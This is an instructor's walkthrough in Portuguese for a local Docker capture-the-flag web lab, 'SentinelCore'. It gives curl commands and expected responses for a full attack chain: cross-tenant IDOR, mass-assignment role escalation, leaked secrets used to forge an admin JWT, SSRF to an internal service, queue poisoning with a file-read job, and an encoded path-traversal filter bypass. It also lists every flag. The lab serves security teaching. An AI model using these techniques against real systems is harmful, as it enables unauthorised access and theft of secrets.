# Walkthrough - Lab 04 SentinelCore

Solucao completa para instrutores do **Lab 04 - SentinelCore**.

Escopo autorizado:

```text
http://127.0.0.1:8094
```

Este walkthrough foca exploracao manual. Os comandos `curl` servem como alternativa de validacao e para reproduzir requests capturadas no Burp.

## 0. Preparacao

Suba o lab:

```bash
cd ~/ctf-labs/lab-04-sentinelcore
docker compose up --build
```

Em outro terminal:

```bash
BASE=http://127.0.0.1:8094
COOKIE=/tmp/lab04-sentinel.cookies
```

## 1. Login como intern

Acesse o navegador:

```text
http://127.0.0.1:8094
```

Entre com:

```text
intern / intern2026
```

Com `curl`:

```bash
curl -i -c "$COOKIE" \
  -d "username=intern" \
  -d "password=intern2026" \
  "$BASE/login"
```

Valide a sessao:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/me"
```

O usuario inicial tem role `viewer`.

## 2. Inspecao do JavaScript

No dashboard, abra DevTools ou acesse diretamente:

```text
http://127.0.0.1:8094/static/js/sentinel.bundle.js
```

O bundle revela nomes de endpoints e formatos esperados:

- `/api/v2/alerts`
- `/api/v2/alerts/{id}`
- `/api/v2/me/profile`
- `/api/v2/debug/health`
- `/api/v2/artifacts/build-manifest`
- `/api/v2/integrations/check`
- `/api/v2/integrations/proxy`
- `/api/v2/reports/render`
- `/api/v2/jobs`
- `/api/v2/jobs/output?file={name}`
- `/api/v2/admin/diagnostics/read?file=app.log`

Tambem aparecem nomes internos como `internal-admin`, `sentinel:jobs` e `/shared`.

## 3. BOLA / IDOR em alertas

Liste os alertas visiveis:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/alerts"
```

O endpoint lista apenas alertas do `owner_id` do usuario. Agora teste leitura direta de objetos por ID:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/alerts/4201"
```

O detalhe nao valida o `owner_id`, permitindo ler alerta de outro tenant.

Flag:

```text
flag{bola_alert_cross_tenant}
```

Pista importante no alerta:

```text
Old debug health checks referenced auth material as sentinelcore-dev-****.
```

## 4. Mass Assignment para analyst

O bundle mostra `PATCH /api/v2/me/profile`. Envie um JSON com campo extra `role`.

No Burp Repeater, capture ou monte:

```http
PATCH /api/v2/me/profile HTTP/1.1
Content-Type: application/json
Cookie: token=...

{
  "displayName": "SOC Intern",
  "role": "analyst"
}
```

Com `curl`:

```bash
curl -i -b "$COOKIE" -c "$COOKIE" \
  -X PATCH "$BASE/api/v2/me/profile" \
  -H "Content-Type: application/json" \
  -d '{"displayName":"SOC Intern","role":"analyst"}'
```

O app bloqueia `id`, `username`, `password` e rejeita `role=admin`, mas aceita `role=analyst` e emite novo JWT.

Flag:

```text
flag{mass_assignment_analyst_role}
```

Valide a role efetiva:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/me"
```

## 5. Debug disclosure

Com role `analyst`, acesse:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/debug/health"
```

Retorno esperado:

```json
{
  "status": "ok",
  "service": "sentinelcore-api",
  "build": "2026.05.lab04",
  "diagnostic": "Loaded auth secret: sentinelcore-dev-****",
  "flag": "flag{debug_secret_fragment_disclosed}"
}
```

Flag:

```text
flag{debug_secret_fragment_disclosed}
```

## 6. Build artifact leak

Ainda como `analyst`, acesse o manifesto antigo:

```bash
curl -s -b "$COOKIE" "$BASE/api/v2/artifacts/build-manifest"
```

O arquivo vazado contem:

```text
JWT_SECRET=sentinelcore-dev-2026
INTERNAL_ADMIN_TOKEN=internal-admin-token-7f3a9c21
```

Flag:

```text
flag{old_build_manifest_leaked_secrets}
```

Esse vazamento conecta as proximas etapas: forjar JWT admin e usar token interno.

## 7. Forge de JWT admin

O cookie `token` e um JWT assinado com HS256. Com o segredo vazado, crie um token com `role=admin`.

Opcao pratica usando o container da aplicacao:

```bash
ADMIN_TOKEN=$(docker compose exec -T sentinel-app node -e 'const jwt=require("jsonwebtoken"); process.stdout.write(jwt.sign({id:1,username:"intern",role:"admin",scope:["admin:read","alerts:read"]},"sentinelcore-dev-2026",{expiresIn:"3h"}));')
ADMIN_COOKIE="token=$ADMIN_TOKEN"
```

No Burp, a alternativa manual e decodificar o JWT atual, alterar a claim `role` para `admin`, assinar com `sentinelcore-dev-2026` e substituir o cookie.

Valide acesso admin:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" "$BASE/api/v2/admin/final"
```

Flag:

```text
flag{jwt_forged_admin_access}
```

A resposta tambem indica que a flag final esta em disco e requer uma primitiva de leitura.

## 8. SSRF para internal-admin

O endpoint de integracao aceita uma URL e bloqueia apenas alguns nomes obvios como `localhost` e `127.0.0.1`. O nome Docker `internal-admin` continua acessivel pela rede interna.

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/status"}' \
  "$BASE/api/v2/integrations/check"
```

Flag:

```text
flag{ssrf_reached_internal_admin}
```

Impacto: a aplicacao principal consegue fazer requests para um servico que nao esta exposto no host.

## 9. Proxy interno com headers

O manifesto antigo vazou:

```text
internal-admin-token-7f3a9c21
```

O endpoint admin `/api/v2/integrations/proxy` aceita headers customizados. Use o token interno.

Usuarios internos:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/users","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy"
```

Flag:

```text
flag{internal_admin_token_accepted}
```

Configuracao interna:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-admin:8081/internal/config","headers":{"x-internal-token":"internal-admin-token-7f3a9c21"}}' \
  "$BASE/api/v2/integrations/proxy"
```

Flag:

```text
flag{internal_config_disclosed}
```

O config confirma a fila `sentinel:jobs`, os tipos de job e o output em `/shared`.

## 10. Template context disclosure

O renderer nao usa `eval` nem executa codigo, mas disponibiliza contexto sensivel em placeholders.

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"title":"debug","template":"user={{user.username}} role={{user.role}} secret={{config.jwt_hint}} internal={{config.internal_token_hint}}"}' \
  "$BASE/api/v2/reports/render"
```

Flag:

```text
flag{template_context_leaked}
```

Licao: template injection nem sempre precisa virar RCE para ter impacto. Vazamento de contexto sensivel ja pode comprometer a cadeia.

## 11. Queue poisoning

Agora enfileire um job `token.debug`:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"type":"token.debug","source":"manual","output":"worker-token.txt"}' \
  "$BASE/api/v2/jobs"
```

Aguarde o worker consumir:

```bash
sleep 2
```

Leia o output gerado no volume compartilhado:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  "$BASE/api/v2/jobs/output?file=worker-token.txt"
```

Flag:

```text
flag{worker_queue_poisoned}
```

O output tambem revela `WORKER_TOKEN`.

## 12. Leitura de output do worker

Valide o tipo `report.export`:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"type":"report.export","source":"case-4201","output":"case-4201.txt"}' \
  "$BASE/api/v2/jobs"

sleep 2

curl -s -H "Cookie: $ADMIN_COOKIE" \
  "$BASE/api/v2/jobs/output?file=case-4201.txt"
```

Valide tambem a primitiva insegura do worker `file.read`, limitada ao container do worker:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"type":"file.read","source":"/worker/worker.js","output":"worker-source.txt"}' \
  "$BASE/api/v2/jobs"

sleep 2

curl -s -H "Cookie: $ADMIN_COOKIE" \
  "$BASE/api/v2/jobs/output?file=worker-source.txt" | head
```

Essa etapa demonstra risco de fila confiando em jobs controlados por usuario administrativo.

## 13. Arbitrary File Read final

A area admin indicou que a flag final esta em disco. O bundle e o log apontam para:

```text
/api/v2/admin/diagnostics/read?file=app.log
base /app/logs
```

Leitura normal:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  "$BASE/api/v2/admin/diagnostics/read?file=app.log"
```

Tentativa direta com traversal literal deve ser bloqueada:

```bash
curl -i -H "Cookie: $ADMIN_COOKIE" \
  "$BASE/api/v2/admin/diagnostics/read?file=../secrets/final.flag"
```

O filtro bloqueia apenas `../` antes do decode. Codifique a barra:

```bash
curl -s -H "Cookie: $ADMIN_COOKIE" \
  "$BASE/api/v2/admin/diagnostics/read?file=..%2fsecrets%2ffinal.flag"
```

Flag final:

```text
flag{sentinelcore_full_chain_compromised}
```

## 14. Flags do Lab

```text
flag{bola_alert_cross_tenant}
flag{mass_assignment_analyst_role}
flag{debug_secret_fragment_disclosed}
flag{old_build_manifest_leaked_secrets}
flag{jwt_forged_admin_access}
flag{ssrf_reached_internal_admin}
flag{internal_admin_token_accepted}
flag{internal_config_disclosed}
flag{template_context_leaked}
flag{worker_queue_poisoned}
flag{sentinelcore_full_chain_compromised}
```

## Troubleshooting

- Se `/api/v2/debug/health` retornar 403, refaca o `PATCH /api/v2/me/profile` e confirme que o cookie atualizado foi salvo.
- Se rotas admin retornarem 403, confirme que o JWT admin foi assinado com `sentinelcore-dev-2026` e enviado como cookie `token`.
- Se o output do worker retornar 404, aguarde alguns segundos e tente novamente.
- Se `internal-admin` ou Redis responderem no host, ha erro de Compose. Eles devem aparecer apenas como `expose`, sem `ports`.
- Se a leitura final retornar 403, use `%2f` em vez de `/` no traversal.
- Se a leitura final retornar 404, confirme o caminho relativo a partir de `/app/logs`: `..%2fsecrets%2ffinal.flag`.
